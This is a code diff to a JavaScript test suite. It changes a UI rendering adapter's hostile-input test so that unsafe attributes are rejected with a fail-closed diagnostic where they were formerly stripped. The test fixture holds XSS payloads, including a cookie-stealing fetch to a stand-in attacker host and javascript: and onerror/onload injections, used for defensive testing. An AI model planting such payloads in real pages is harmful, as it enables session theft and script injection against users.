@@ -204,7 +204,10 @@ function evaluateXtendRmtArtifact(context, relativePath, rootDir) {
   const source = readText(relativePath, rootDir);
   const sandbox = createSandbox();
   const executableSource = relativePath.endsWith('.esm.js')
-    ? source.replace(/\nexport\s+\{[\s\S]*?\};\s*\nexport default XtendRmtProduct;\s*$/u, '')
+    ? source
+      .replace(/^\s*import\s+[\s\S]*?\s+from\s+['"][^'"]+['"];\s*$/gmu, '')
+      .replace(/^\s*import\s+['"][^'"]+['"];\s*$/gmu, '')
+      .replace(/\nexport\s+\{[\s\S]*?\};\s*\nexport default XtendRmtProduct;\s*$/u, '')
     : source;
   try {
     vm.runInNewContext(executableSource, sandbox, { filename: relativePath });
@@ -372,45 +375,56 @@ function runSurfaceManagerMaterializationSuite(options = {}) {
     const hostileDocument = createFakeDocument();
     const hostileRoot = hostileDocument.createElement('main');
     hostileDocument.body.appendChild(hostileRoot);
-    adapter.materializeSurfaces({
-      surfaces: [{
-        id: 'surface.hostile',
-        type: 'window',
-        manager: 'workbench.manager',
-        component: 'hostile.content'
-      }],
-      components: [{
-        id: 'hostile.content',
-        tag: 'script',
-        attributes: {
-          onerror: 'fetch("https://attacker.example/?c="+document.cookie)',
-          href: 'javascript:alert(1)',
-          style: 'background-image:url(javascript:alert(2))',
-          srcdoc: '<script>alert(3)</script>',
-          title: 'Safe title'
-        },
-        props: {
-          innerHTML: '<img src=x onerror=alert(4)>',
-          outerHTML: '<svg onload=alert(5)>',
-          onclick: 'alert(6)',
-          textContent: 'safe text'
-        }
-      }]
-    }, {
-      root: hostileRoot,
-      domDocument: hostileDocument
-    });
+    let hostileError = null;
+    try {
+      adapter.materializeSurfaces({
+        surfaces: [{
+          id: 'surface.hostile',
+          type: 'window',
+          manager: 'workbench.manager',
+          component: 'hostile.content'
+        }],
+        components: [{
+          id: 'hostile.content',
+          tag: 'script',
+          attributes: {
+            onerror: 'fetch("https://attacker.example/?c="+document.cookie)',
+            href: 'javascript:alert(1)',
+            style: 'background-image:url(javascript:alert(2))',
+            srcdoc: '<script>alert(3)</script>',
+            title: 'Safe title'
+          },
+          props: {
+            innerHTML: '<img src=x onerror=alert(4)>',
+            outerHTML: '<svg onload=alert(5)>',
+            onclick: 'alert(6)',
+            textContent: 'safe text'
+          }
+        }]
+      }, {
+        root: hostileRoot,
+        domDocument: hostileDocument
+      });
+    } catch (error) {
+      hostileError = error;
+    }
     const hostileManager = hostileRoot.querySelector('x-surface-manager');
+    context.assert(
+      hostileError
+        && hostileError.code === 'rmt.dom.attribute.unsafe'
+        && hostileError.diagnostic
+        && hostileError.diagnostic.code === 'rmt.dom.attribute.unsafe',
+      'Surface materialization rejects an unsafe attribute with a fail-closed renderer diagnostic'
+    );
     const hostileSurface = hostileManager && findSurface(hostileManager, 'surface.hostile');
-    const hostileContent = hostileSurface && hostileSurface.children[0];
-    context.assert(hostileContent && hostileContent.localName === 'div', 'Unsafe component tags fall back to inert div elements');
-    context.assert(hostileContent && hostileContent.getAttribute('onerror') === null, 'Surface materialization drops event handler attributes');
-    context.assert(hostileContent && hostileContent.getAttribute('href') === null, 'Surface materialization drops javascript: URL attributes');
-    context.assert(hostileContent && hostileContent.getAttribute('style') === null, 'Surface materialization drops inline style attributes');
-    context.assert(hostileContent && hostileContent.getAttribute('srcdoc') === null, 'Surface materialization drops srcdoc attributes');
-    context.assert(hostileContent && hostileContent.innerHTML === undefined, 'Surface materialization does not assign innerHTML props');
-    context.assert(hostileContent && hostileContent.onclick === undefined, 'Surface materialization does not assign event handler props');
-    context.assert(hostileContent && hostileContent.textContent === 'safe text', 'Surface materialization preserves safe scalar props');
+    context.assert(
+      hostileManager
+        && hostileRoot.children.length === 1
+        && hostileSurface === null
+        && hostileManager.children.length === 0
+        && hostileManager.registered.length === 0,
+      'Rejected surface materialization leaves no surface, content or controller registration behind'
+    );
 
     const existingDocument = createFakeDocument();
     const existingManager = existingDocument.createElement('x-surface-manager');
